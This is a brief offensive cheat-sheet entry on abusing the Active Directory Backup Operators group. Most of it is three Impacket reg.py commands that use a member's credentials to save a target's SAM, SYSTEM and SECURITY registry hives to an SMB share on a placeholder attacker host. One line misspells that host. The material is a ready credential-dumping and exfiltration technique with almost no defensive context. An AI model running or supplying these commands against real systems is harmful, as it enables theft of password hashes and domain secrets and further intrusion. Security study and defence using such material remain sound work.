
**Backup Operators** is a built-in group in Active Directory environments that grants members the ability to back up and restore files, regardless of file permissions. Members of this group can bypass NTFS permissions to perform backup and restore operations on the system.

```
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'
```